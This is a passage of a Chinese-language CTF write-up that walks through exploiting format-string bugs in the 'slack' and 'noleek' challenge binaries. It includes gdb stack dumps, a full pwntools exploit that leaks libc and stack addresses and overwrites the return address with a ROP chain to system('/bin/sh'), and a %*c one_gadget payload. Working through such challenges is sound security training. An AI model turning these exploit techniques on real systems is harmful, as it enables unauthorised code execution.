+i=11 data=b'0x35323a3731203431'
+i=12 data=b'0x32343a'
+i=13 data=b'(nil)'
+i=14 data=b'0xa7024343125'
+i=15 data=b'(nil)'
+root@8edd47208f9e:/chal# python3 exp.py
+i=0 data=b'%0$p'
+i=1 data=b'0x7ffe90dc0320'    &lt;---
+i=2 data=b'(nil)'
+i=3 data=b'0x7f02f86a3a37'    &lt;---
+i=4 data=b'0x1c'
+i=5 data=b'0x7fffffff'
+i=6 data=b'(nil)'
+i=7 data=b'(nil)'
+i=8 data=b'0x64b18517'
+i=9 data=b'0x7f137e5e76a0'    &lt;---
+i=10 data=b'0x2d37302d33323032'
+i=11 data=b'0x35323a3731203431'
+i=12 data=b'0x33343a'
+i=13 data=b'(nil)'
+i=14 data=b'0xa7024343125'
+i=15 data=b'(nil)'
+</code></pre>
+<p>接着，用gdb确认一下这两个index是否是stack和libc的地址，并计算偏移：</p>
+<pre><code class="language-python"># step1: leak stack/libc
+sla(b&quot;): &quot;, &quot;%1$p %9$p&quot;)
+ru(&quot;You: &quot;)
+data = rl().strip().decode().split()
+some_stack_addr = data[0]
+some_libc_addr = data[1]
+logsucc(&quot;some_stack_addr = &quot; + some_stack_addr)
+logsucc(&quot;some_libc_addr = &quot; + some_libc_addr)
+dbg()
+
+itr()
+</code></pre>
+<p><code>ret_addr - some_stack_addr = 0x7ffc8fb1e328 - 0x7ffc8fb1c190</code></p>
+<p><code>libc_base_addr - some_libc_addr = 0x7f35e31bf000 - 0x7f35e33df6a0</code></p>
+<figure data-type="image" tabindex="9"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182722.png" alt="image-20230715021206586" loading="lazy"></figure>
+<p>验证之后，毛有问题。</p>
+<pre><code class="language-python"># step1: leak stack/libc
+sla(b&quot;): &quot;, &quot;%1$p %9$p&quot;)
+ru(&quot;You: &quot;)
+data = rl().strip().decode().split()
+some_stack_addr = data[0]
+some_libc_addr = data[1]
+logsucc(&quot;some_stack_addr = &quot; + some_stack_addr)
+logsucc(&quot;some_libc_addr = &quot; + some_libc_addr)
+main_ret_addr = int(some_stack_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190)
+libc_base_addr = int(some_libc_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0)
+libc.address = libc_base_addr
+leak(&quot;main_ret_addr&quot;, main_ret_addr)
+leak(&quot;libc_base_addr&quot;, libc_base_addr)
+dbg()
+
+itr()
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182752.png" alt="image-20230715021938323" loading="lazy"></figure>
+<h3 id="532-修改变量i的值为一个大负数">5.3.2 修改变量i的值为一个大负数</h3>
+<p>还有两次触发机会。接下来需要把一个rop链的地址写到<code>main_ret_addr</code>里，也就是要把一个大数（8字节）写入到某个地址，那这需要一个字节一个字节写。还是那个问题，输入长度有限，不能一次性写长的payload，而现在触发printf的机会也只剩两次了。那可以修改局部变量i为一个负数来增加循环次数，从而增加触发printf的机会。</p>
+<p>要覆写i为一个负数，首先来看一下i的地址：</p>
+<pre><code class="language-c">  int i; // [rsp+8h] [rbp-68h]
+</code></pre>
+<p>那么泄露i的地址：</p>
+<pre><code class="language-python"># step2: set i to some negative number
+i_addr = main_ret_addr - (0x68+8)
+leak(&quot;i_addr&quot;, i_addr)
+</code></pre>
+<p>结果如下：</p>
+<pre><code class="language-shell">root@8edd47208f9e:/chal# python3 exp.py
+......
+[+] i_addr = 0x7fff1d91b458
+</code></pre>
+<p>对于整型变量i来说，其内容为4个字节，</p>
+<pre><code class="language-shell">00     00     00     01
+addr+3              addr
+</code></pre>
+<p>要将其值变成负数，最简单的方法就是把最高的一个字节变成0xff（256）。</p>
+<pre><code>(i_addr+3) + &quot;%kc%j$hhn&quot;
+  8Byte         最少9Byte
+</code></pre>
+<p>很明显，输入空间不足以支撑。需要另想办法，如下图。</p>
+<figure data-type="image" tabindex="11"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230715171952.png" alt="image-20230715171949130" loading="lazy"></figure>
+<p>一步一步来，先来看看循环第二次时，<code>call printf</code>时栈的情况：</p>
+<pre><code class="language-shell">root@8edd47208f9e:/chal# gdb slack
+......
+pwndbg&gt; b *main+402
+Breakpoint 1 at 0x145b
+pwndbg&gt; r
+......
+pwndbg&gt; stack 50
+00:0000│ rsp 0x7ffe27708e20 ◂— 0x0
+01:0008│     0x7ffe27708e28 ◂— 0x1     &lt;--- 这个是变量i
+02:0010│     0x7ffe27708e30 ◂— 0x64b26afd
+03:0018│     0x7ffe27708e38 —▸ 0x7ff6be6e56a0 (_tmbuf) ◂— 0x2e00000025 /* '%' */
+04:0020│     0x7ffe27708e40 ◂— '2023-07-15 09:46:37'
+05:0028│     0x7ffe27708e48 ◂— '15 09:46:37'
+06:0030│     0x7ffe27708e50 ◂— 0x37333a /* ':37' */
+07:0038│     0x7ffe27708e58 ◂— 0x0
+08:0040│ rdi 0x7ffe27708e60 ◂— 'BBBBBBBB\n'
+09:0048│     0x7ffe27708e68 ◂— 0xa /* '\n' */
+0a:0050│     0x7ffe27708e70 ◂— 0x0
+... ↓        2 skipped
+0d:0068│     0x7ffe27708e88 ◂— 0x1109c51ee9704900
+0e:0070│ rbp 0x7ffe27708e90 ◂— 0x1
+0f:0078│     0x7ffe27708e98 —▸ 0x7ff6be4eed90 (__libc_start_call_main+128) ◂— mov edi, eax
+10:0080│     0x7ffe27708ea0 ◂— 0x0
+11:0088│     0x7ffe27708ea8 —▸ 0x55e4931932c9 (main) ◂— endbr64
+12:0090│     0x7ffe27708eb0 ◂— 0x100000000
+13:0098│     0x7ffe27708eb8 —▸ 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'&lt;---[1]这个，它指向下面的内存[2]
+14:00a0│     0x7ffe27708ec0 ◂— 0x0
+15:00a8│     0x7ffe27708ec8 ◂— 0xba423f3e3c4e0a1f
+16:00b0│     0x7ffe27708ed0 —▸ 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'&lt;---或者这个
+17:00b8│     0x7ffe27708ed8 —▸ 0x55e4931932c9 (main) ◂— endbr64
+18:00c0│     0x7ffe27708ee0 —▸ 0x55e493195d60 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55e493193280 (__do_global_dtors_aux) ◂— endbr64
+19:00c8│     0x7ffe27708ee8 —▸ 0x7ff6be72e040 (_rtld_global) —▸ 0x7ff6be72f2e0 —▸ 0x55e493192000 ◂— 0x10102464c457f
+1a:00d0│     0x7ffe27708ef0 ◂— 0x45be71df210c0a1f
+1b:00d8│     0x7ffe27708ef8 ◂— 0x45af43a3e6c40a1f
+1c:00e0│     0x7ffe27708f00 ◂— 0x7ff600000000
+1d:00e8│     0x7ffe27708f08 ◂— 0x0
+... ↓        3 skipped
+21:0108│     0x7ffe27708f28 ◂— 0x1109c51ee9704900
+22:0110│     0x7ffe27708f30 ◂— 0x0
+23:0118│     0x7ffe27708f38 —▸ 0x7ff6be4eee40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
+24:0120│     0x7ffe27708f40 —▸ 0x7ffe27708fb8 —▸ 0x7ffe2770a8e9 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
+25:0128│     0x7ffe27708f48 —▸ 0x55e493195d60 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55e493193280 (__do_global_dtors_aux) ◂— endbr64
+26:0130│     0x7ffe27708f50 —▸ 0x7ff6be72f2e0 —▸ 0x55e493192000 ◂— 0x10102464c457f
+27:0138│     0x7ffe27708f58 ◂— 0x0
+28:0140│     0x7ffe27708f60 ◂— 0x0
+29:0148│     0x7ffe27708f68 —▸ 0x55e4931931e0 (_start) ◂— endbr64
+2a:0150│     0x7ffe27708f70 —▸ 0x7ffe27708fa0 ◂— 0x1
+2b:0158│     0x7ffe27708f78 ◂— 0x0
+2c:0160│     0x7ffe27708f80 ◂— 0x0
+2d:0168│     0x7ffe27708f88 —▸ 0x55e493193205 (_start+37) ◂— hlt
+2e:0170│     0x7ffe27708f90 —▸ 0x7ffe27708f98 ◂— 0x1c
+2f:0178│     0x7ffe27708f98 ◂— 0x1c
+30:0180│     0x7ffe27708fa0 ◂— 0x1
+31:0188│ r12 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'         &lt;---[2]修改其值，让他指向变量i
+</code></pre>
+<p>因为上面stack命令的结果中，序号是从0开始的，所以，选择的第一个地址的偏移是 0x13+1+5=25，第二个地址的偏移是0x31+1+5=55：</p>
+<pre><code>    ------------------ 0x7ffe27708e28
+01        i           【2】&quot;%255c%55$hn&quot; ：修改i的最高一个字节为0xff
+    ------------------
+    ......
+    ------------------ 0x7ffe27708eb8
+25    0x7ffe27708fa8  
+    ------------------ 
+    ......
+    ------------------0x7ffe27708fa8
+55    0x7ffe2770a8dd  【1】f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot; ：将0x7ffe2770a8dd变成0x7ffe27708e2B
+</code></pre>
+<blockquote>
+<p>为什么<code>%25$hn</code>改变的是0x7ffe2770a8dd，而不是0x7ffe27708fa8？</p>
+<p>因为<code>%n</code>对应的参数是个地址，比如：<code>printf(&quot;testtest %n\n&quot;, &amp;c);</code></p>
+<p>这里<code>%n</code>对应的参数就是<code>&amp;c</code>，而上面的例子中，对应的参数就是0x7ffe27708fa8，改变的内容自然就是0x7ffe2770a8dd了。</p>
+</blockquote>
+<p>对应脚本如下：</p>
+<pre><code class="language-python"># step2: set i to some negative number
+i_addr = main_ret_addr - (0x68+8)
+leak(&quot;i_addr&quot;, i_addr)
+#dbg()
+
+print(f&quot;%{hex(i_addr + 3)}&quot;) # 变量i最高一个字节的地址
+print(f&quot;%{hex((i_addr + 3) &amp; 0xffff)}&quot;) # 变量i最高一个字节的地址的最低2字节
+sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;) # 将这两字节写入到栈上某个值，令这个值变成 变量i的地址
+sla(b&quot;): &quot;, b&quot;%255c%55$hn&quot;) # 将0xff写入到变量i内容的最高1字节
+# dbg()
+
+itr()
+</code></pre>
+<p>结果如下，确实变成了一个绝对值很大的负数：</p>
+<figure data-type="image" tabindex="12"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716023412.png" alt="image-20230715181948314" loading="lazy"></figure>
+<h3 id="533-覆写main_ret为rop链">5.3.3 覆写<code>main_ret</code>为rop链</h3>
+<p>同样因为输入长度限制的原因，覆写<code>main_ret</code>的方法和覆写i的方法一样：</p>
+<pre><code class="language-python"># step3: overwrite return address with rop
+rop = ROP(libc)
+rop.raw(rop.find_gadget([&quot;ret&quot;]))
+rop.system(next(libc.search(b&quot;/bin/sh&quot;)))
+chain = rop.chain() # 构造rop链
+# print(&quot;=======&quot;)
+# print(rop.dump())
+
+# one_gadget = libc.address + 0x50A37
+# print(f&quot;{hex(one_gadget)=}&quot;)
+
+for i in range(len(rop.chain())):
+    payload = chain[i]
+    
+    out = f&quot;%{(main_ret_addr + i) &amp; 0xffff}c%25$hn&quot;  
+    print(f&quot;{i=} {out=}&quot;)
+    sa(b&quot;): &quot;, out.encode()) #修改offset=55处的内容为ret地址
+
+    if payload == 0:
+        out = f&quot;%55$hhn&quot;
+        print(f&quot;{i=} {out=}&quot;)
+    else:
+        out = f&quot;%{payload}c%55$hhn&quot;
+        print(f&quot;{i=} {out=}&quot;)
+    sla(b&quot;): &quot;, out) # 一字节一字节地覆写ret
+
+sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;)
+sla(b&quot;): &quot;, b&quot;%55$hhn&quot;) # 把i改回来，不然会卡在循环里
+
+itr()
+</code></pre>
+<h2 id="54-exp">5.4 exp</h2>
+<pre><code class="language-python">from pwn import *
+import warnings
+import subprocess
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64') # 【注意】加上架构信息，不然rop模块会把该程序当成32位程序
+context.log_level = 'DEBUG'
+# context.log_level = 'CRITICAL'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+def dbg():
+    gdb.attach(p)
+    # pause()
+
+elf = ELF(&quot;./slack&quot;)
+p = process(&quot;./slack&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+# for i in range(0x10):
+#     p = process(&quot;./slack&quot;)
+#     sla(b&quot;): &quot;, f&quot;%{i}$p&quot;)
+#     ru(&quot;You: &quot;)
+#     data = rl().strip()
+#     print(f&quot;{i=} {data=}&quot;)
+#     p.close()
+
+# step1: leak stack/libc
+sla(b&quot;): &quot;, &quot;%1$p %9$p&quot;)
+ru(&quot;You: &quot;)
+data = rl().strip().decode().split()
+some_stack_addr = data[0]
+some_libc_addr = data[1]
+logsucc(&quot;some_stack_addr = &quot; + some_stack_addr)
+logsucc(&quot;some_libc_addr = &quot; + some_libc_addr)
+main_ret_addr = int(some_stack_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190)
+libc_base_addr = int(some_libc_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0)
+libc.address = libc_base_addr
+leak(&quot;main_ret_addr&quot;, main_ret_addr)
+leak(&quot;libc_base_addr&quot;, libc_base_addr)
+# dbg()
+
+
+# step2: set i to some negative number
+i_addr = main_ret_addr - (0x68+8)
+leak(&quot;i_addr&quot;, i_addr)
+# dbg()
+
+print(f&quot;%{hex(i_addr + 3)}&quot;) # 变量i最高一个字节的地址
+print(f&quot;%{hex((i_addr + 3) &amp; 0xffff)}&quot;) # 变量i最高一个字节的地址的最低2字节
+sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;) # 将这两字节写入到栈上某个值，令这个值变成 变量i的地址 （此处发送的数据极容易达到13个字节，比如b'%54603c%25$hn'。因此应该用sa，而不要用sla，否则在缓冲区里还存着一个\x00，下一行再次发送数据的时候会导致错误）
+sla(b&quot;): &quot;, b&quot;%255c%55$hn&quot;) # 将0xff写入到变量i内容的最高1字节
+# dbg()
+
+# step3: overwrite return address with rop
+rop = ROP(libc)
+rop.raw(rop.find_gadget([&quot;ret&quot;]))
+rop.system(next(libc.search(b&quot;/bin/sh&quot;)))
+chain = rop.chain() # 构造rop链
+# print(&quot;=======&quot;)
+# print(rop.dump())
+
+# one_gadget = libc.address + 0x50A37
+# print(f&quot;{hex(one_gadget)=}&quot;)
+
+for i in range(len(rop.chain())):
+    payload = chain[i]
+    
+    out = f&quot;%{(main_ret_addr + i) &amp; 0xffff}c%25$hn&quot;  
+    print(f&quot;{i=} {out=}&quot;)
+    sa(b&quot;): &quot;, out.encode()) #修改offset=55处的内容为ret地址
+
+    if payload == 0:
+        out = f&quot;%55$hhn&quot;
+        print(f&quot;{i=} {out=}&quot;)
+    else:
+        out = f&quot;%{payload}c%55$hhn&quot;
+        print(f&quot;{i=} {out=}&quot;)
+    sla(b&quot;): &quot;, out) # 一字节一字节地覆写ret
+
+# 下面尝试写了写 直接覆写ret，当然因为输入长度限制的原因，肯定是不能成功的。
+# for i in range(len(rop.chain())):
+#     payload = chain[i]
+#     # print(payload)
+#     if payload == 0:  # 写入0
+#         out = f&quot;%22$hnnA&quot;.encode() + p64(main_ret_addr + i)
+#         print(f&quot;{i=} {out=}&quot;)
+#     else:
+#         payload2 = payload - 8
+#         out = p64(main_ret_addr + i) + f&quot;%{payload2}c%21$hnn&quot;.encode()
+#         print(f&quot;{i=} {out=}&quot;)
+
+#     # out = f&quot;%{payload}c%21$hhn&quot; # 0xf+1+5=21
+#     sa(b&quot;): &quot;, out)
+#     dbg()
+
+sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;)
+sla(b&quot;): &quot;, b&quot;%55$hhn&quot;) # 把i改回来，不然会卡在循环里
+
+itr()
+
+# exit(0)
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230715191030.png" alt="image-20230715191027262" loading="lazy"></figure>
+<blockquote>
+<p>注意sa 和 sla 的问题，见注释。</p>
+</blockquote>
+<h1 id="6-noleek">6 noleek</h1>
+<blockquote>
+<p>My code had a couple of pesky format string vulnerabilities that kept getting exploited...I'm sure it'll fix itself if I just compile with RELRO and take away output...</p>
+<p>题目说明很清楚，存在格式化字符串漏洞，但是使用 RELRO 进行编译并删除了输出。</p>
+<p>注意做题环境，这道题的环境是<code>debian@sha256:98......</code>，我一开始用ubuntu22做题，调试的时候执行到<code>fprintf</code>过不去，会崩掉。</p>
+</blockquote>
+<p>Dockerfile如下：</p>
+<pre><code class="language-dockerfile">FROM pwn.red/jail
+
+COPY --from=debian@sha256:98d3b4b0cee264301eb1354e0b549323af2d0633e1c43375d0b25c01826b6790 / /srv
+COPY noleek /srv/app/run
+COPY flag.txt /srv/app/flag.txt
+RUN chmod 755 /srv/app/run
+</code></pre>
+<h2 id="61-运行分析">6.1 运行分析</h2>
+<p>有源码，先看看源码。如下所示，两次输入，然后输出不再是给stdout，而是给了<code>/dev/null</code></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define LEEK 32
+
+void cleanup(int a, int b, int c) {}
+
+int main(void) {
+    setbuf(stdout, NULL);
+    FILE* leeks = fopen(&quot;/dev/null&quot;, &quot;w&quot;);
+    if (leeks == NULL) {
+        puts(&quot;wtf&quot;);
+        return 1;
+    }
+    printf(&quot;leek? &quot;);
+    char inp[LEEK];
+    fgets(inp, LEEK, stdin); // 往长度为32的栈buffer输入数据
+    fprintf(leeks, inp);     // 把输入输出到/dev/null，格式化字符串漏洞
+    printf(&quot;more leek? &quot;);
+    fgets(inp, LEEK, stdin); // 再次输入
+    fprintf(leeks, inp);     // 格式化字符串漏洞
+    printf(&quot;noleek.\n&quot;);
+    cleanup(0, 0, 0);
+    return 0;
+}
+</code></pre>
+<p>fprintf函数原型：</p>
+<pre><code class="language-c">//发送格式化输出到流 stream 中
+int fprintf(FILE *stream, const char *format, ...)
+// 正常使用
+fprintf(fp, &quot;%s %s %s %d&quot;, &quot;We&quot;, &quot;are&quot;, &quot;in&quot;, 2014);
+</code></pre>
+<p>关闭Canary，RELRO是Full RELRO。</p>
+<pre><code class="language-shell">root@429d186baf6b:/chal# ./noleek
+leek? aaa
+more leek? aaa
+noleek.
+root@429d186baf6b:/chal#
+root@429d186baf6b:/chal# checksec noleek
+[*] '/chal/noleek'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>这道题没有输出，也就不能泄露地址了。利用思路参考上一题，不过区别是本题利用<code>%*c</code>来修改栈里存储的某个指针的低4字节（为什么是4字节？见下面），使其指向存储<code>main_ret</code>的地方。</p>
+<h3 id="格式化字符串中的作用">格式化字符串中<code>*</code>的作用</h3>
+<p>星号在 printf 格式化字符串中的作用是用于指定动态宽度或精度。在输出字符串时，星号可以通过传递另一参数（ <code>int</code> 类型）的方式动态定义输出的宽度或精度。测试格式化字符串中 <code>*</code> 的作用：</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+void main(){
+    printf(&quot;%*c&quot;, 5, '*');// 输出一个星号字符 '*'，并指定宽度为 5
+    printf(&quot;\n&quot;);
+    printf(&quot;%.*f&quot;, 2, 3.14159);
+    printf(&quot;\n&quot;);
+}
+</code></pre>
+<ul>
+<li>第一个输出结果：在宽度为 5 的位置上输出星号字符</li>
+<li>第二个输出结果：星号指定了精度为 2，输出结果保留两位小数</li>
+</ul>
+<pre><code class="language-shell">root@429d186baf6b:/chal# ./a.out
+    *
+3.14
+</code></pre>
+<h2 id="62-调试">6.2 调试</h2>
+<p>gdb调试，输入<code>AAAAAAAA.%p.%p.%p.%p</code>。</p>
+<ul>
+<li>存储<code>main_ret</code>的地址是0x7ffc6faf3498</li>
+<li>rsi，也就是fprintf第二个参数<code>inp</code>的地址是0x7ffc6faf3460</li>
+<li>fprintf第三个参数vararg的值和rsi一致，也是0x7ffc6faf3460</li>
+</ul>
+<figure data-type="image" tabindex="14"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716021113.png" alt="image-20230716021111567" loading="lazy"></figure>
+<p>和上一题一样，在栈里找一个存储了栈地址的地方，算出其偏移（fprintf格式化字符串参数之后的第几个参数）</p>
+<pre><code class="language-shell">pwndbg&gt; stack 30
+00:0000│ rdx rsi r8 rsp 0x7ffc6faf3460 ◂— 'AAAAAAAA.%p.%p.%p.%p\n'
+01:0008│                0x7ffc6faf3468 ◂— '.%p.%p.%p.%p\n'
+02:0010│                0x7ffc6faf3470 ◂— 0xa70252e70 /* 'p.%p\n' */
+03:0018│                0x7ffc6faf3478 —▸ 0x55cc237c30a0 (_start) ◂— xor ebp, ebp
+04:0020│                0x7ffc6faf3480 —▸ 0x7ffc6faf3580 ◂— 0x1
+05:0028│                0x7ffc6faf3488 —▸ 0x55cc242652a0 ◂— 0xfbad2484
+06:0030│ rbp            0x7ffc6faf3490 —▸ 0x55cc237c3290 (__libc_csu_init) ◂— push r15
+07:0038│                0x7ffc6faf3498 —▸ 0x7f3cd6c26d0a (__libc_start_main+234) ◂— mov edi, eax #[1]main_ret
+08:0040│                0x7ffc6faf34a0 —▸ 0x7ffc6faf3588 —▸ 0x7ffc6faf4f0c ◂— '/chal/noleek'  # [2]
+09:0048│                0x7ffc6faf34a8 ◂— 0x100000000
+0a:0050│                0x7ffc6faf34b0 —▸ 0x55cc237c3195 (main) ◂— push rbp
+0b:0058│                0x7ffc6faf34b8 —▸ 0x7f3cd6c267cf (init_cacheinfo+287) ◂— mov rbp, rax
+0c:0060│                0x7ffc6faf34c0 ◂— 0x0
+0d:0068│                0x7ffc6faf34c8 ◂— 0x8863beef03c1ee55
+0e:0070│                0x7ffc6faf34d0 —▸ 0x55cc237c30a0 (_start) ◂— xor ebp, ebp
+0f:0078│                0x7ffc6faf34d8 ◂— 0x0
+... ↓                   2 skipped
+12:0090│                0x7ffc6faf34f0 ◂— 0xdc0327490fa1ee55
+13:0098│                0x7ffc6faf34f8 ◂— 0xdd825593bf67ee55
+14:00a0│                0x7ffc6faf3500 ◂— 0x0
+... ↓                   2 skipped
+17:00b8│                0x7ffc6faf3518 ◂— 0x1
+18:00c0│                0x7ffc6faf3520 —▸ 0x7ffc6faf3588 —▸ 0x7ffc6faf4f0c ◂— '/chal/noleek' # [3]
+19:00c8│                0x7ffc6faf3528 —▸ 0x7ffc6faf3598 —▸ 0x7ffc6faf4f19 ◂— 'HOSTNAME=cb420c074f1e'
+1a:00d0│                0x7ffc6faf3530 —▸ 0x7f3cd6e0b180 —▸ 0x55cc237c2000 ◂— 0x10102464c457f
+1b:00d8│                0x7ffc6faf3538 ◂— 0x0
+1c:00e0│                0x7ffc6faf3540 ◂— 0x0
+1d:00e8│                0x7ffc6faf3548 —▸ 0x55cc237c30a0 (_start) ◂— xor ebp, ebp
+</code></pre>
+<p>偏移：</p>
+<ul>
+<li>[2] 8+1+4=13</li>
+<li>[3] 0x18+1+4=29</li>
+<li>加4是因为这里格式化字符串是第二个参数了</li>
+</ul>
+<p>如果选[2]这个偏移，格式化字符串可以这样写：</p>
+<pre><code class="language-python">%*c%13$hn
+</code></pre>
+<p>在上面调试记录中，fprintf第三个参数vararg是0x7ffc6faf3460，所以<code>%*c</code>对应的整型值是0x6faf3460。所以，发送payload后，会将地址0x7ffc6faf3588里的内容0x7ffc6faf4f0c改成0x7ffc6faf3460。</p>
+<p>而我们的目的是将地址0x7ffc6faf3588里的内容改成存储<code>main_ret</code>的地址，因此还需要计算0x7ffc6faf3460和<code>addr(main_ret)</code>的偏移：</p>
+<pre><code class="language-shell">pwndbg&gt; p/x 0x7ffc6faf3498-0x7ffc6faf3460
+$1 = 0x38
+</code></pre>
+<blockquote>
+<p>其实这里有个隐含要求，就是<code>addr(main_ret)</code>需要大于vararg，因为我们只能在vararg低4Byte的基础上再加字符，好在题目里是满足的。</p>
+</blockquote>
+<p>修改格式化字符串:</p>
+<pre><code class="language-python">%*c%56c%13$hn
+</code></pre>
+<p>下面调试查看结果：</p>
+<ul>
+<li><code>call fprintf</code>前：</li>
+</ul>
+<figure data-type="image" tabindex="15"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182800.png" alt="image-20230716172102163" loading="lazy"></figure>
+<ul>
+<li><code>call fprintf</code>后：</li>
+</ul>
+<figure data-type="image" tabindex="16"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182805.png" alt="image-20230716172207879" loading="lazy"></figure>
+<p>0x7ffe48560ed8对于fprintf函数来说，是格式化字符串参数后的第42个参数。</p>
+<pre><code class="language-shell">pwndbg&gt; p (0x7ffe48560ed8-0x7ffe48560db0)/8+1+4
+$2 = 42
+
+</code></pre>
+<p>现在第42个参数已经改成了<code>main_ret</code>的存放地址，那么接下来就是将其改成gadget的地址。</p>
+<p>现在栈里找一个距离libc地址近的地址，第16个参数就可以：</p>
+<pre><code class="language-shell">0b:0058│       0x7ffe48560e08 —▸ 0x7fa20b7e57cf (init_cacheinfo+287) ◂— mov rbp, rax
+
+
+pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+             Start                End Perm     Size Offset File
+    0x560a5c98a000     0x560a5c98b000 r--p     1000      0 /chal/noleek
+    0x560a5c98b000     0x560a5c98c000 r-xp     1000   1000 /chal/noleek
+    0x560a5c98c000     0x560a5c98d000 r--p     1000   2000 /chal/noleek
+    0x560a5c98d000     0x560a5c98e000 r--p     1000   2000 /chal/noleek
+    0x560a5c98e000     0x560a5c98f000 rw-p     1000   3000 /chal/noleek
+    0x560a5e5ef000     0x560a5e610000 rw-p    21000      0 [heap]
+    0x7fa20b7c2000     0x7fa20b7e4000 r--p    22000      0 /lib/x86_64-linux-gnu/libc-2.31.so
+    0x7fa20b7e4000     0x7fa20b93d000 r-xp   159000  22000 /lib/x86_64-linux-gnu/libc-2.31.so
+    0x7fa20b93d000     0x7fa20b98c000 r--p    4f000 17b000 /lib/x86_64-linux-gnu/libc-2.31.so
+    0x7fa20b98c000     0x7fa20b990000 r--p     4000 1c9000 /lib/x86_64-linux-gnu/libc-2.31.so
+    0x7fa20b990000     0x7fa20b992000 rw-p     2000 1cd000 /lib/x86_64-linux-gnu/libc-2.31.so
+    0x7fa20b992000     0x7fa20b998000 rw-p     6000      0 [anon_7fa20b992]
+    0x7fa20b99e000     0x7fa20b99f000 r--p     1000      0 /lib/x86_64-linux-gnu/ld-2.31.so
+    0x7fa20b99f000     0x7fa20b9bf000 r-xp    20000   1000 /lib/x86_64-linux-gnu/ld-2.31.so
+    0x7fa20b9bf000     0x7fa20b9c7000 r--p     8000  21000 /lib/x86_64-linux-gnu/ld-2.31.so
+    0x7fa20b9c8000     0x7fa20b9c9000 r--p     1000  29000 /lib/x86_64-linux-gnu/ld-2.31.so
+    0x7fa20b9c9000     0x7fa20b9ca000 rw-p     1000  2a000 /lib/x86_64-linux-gnu/ld-2.31.so
+    0x7fa20b9ca000     0x7fa20b9cb000 rw-p     1000      0 [anon_7fa20b9ca]
+    0x7ffe48541000     0x7ffe48562000 rw-p    21000      0 [stack]
+    0x7ffe485bd000     0x7ffe485c1000 r--p     4000      0 [vvar]
+    0x7ffe485c1000     0x7ffe485c3000 r-xp     2000      0 [vdso]
+0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]
+</code></pre>
+<p>再看看它和<code>one_gadget</code>之间的偏移是多少：<code>0xa4a91</code></p>
+<pre><code class="language-shell">root@d3b03dc58069:/chal# one_gadget /lib/x86_64-linux-gnu/libc-2.31.so
+0xc825a execve(&quot;/bin/sh&quot;, r12, r13)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [r13] == NULL || r13 == NULL
+
+0xc825d execve(&quot;/bin/sh&quot;, r12, rdx)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xc8260 execve(&quot;/bin/sh&quot;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+</code></pre>
+<pre><code class="language-shell">pwndbg&gt; p/x (0x7fa20b7c2000+0xc8260)-0x7fa20b7e57cf
+$4 = 0xa4a91
+pwndbg&gt; p 0xa4a91
+$5 = 674449
+</code></pre>
+<blockquote>
+<p>这里选的是第三个gadget，因为main函数返回前将rsi和rdx清零了，满足第三个gadget的constraints：</p>
+<figure data-type="image" tabindex="17"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716184532.png" alt="image-20230716184528949" loading="lazy"></figure>
+</blockquote>
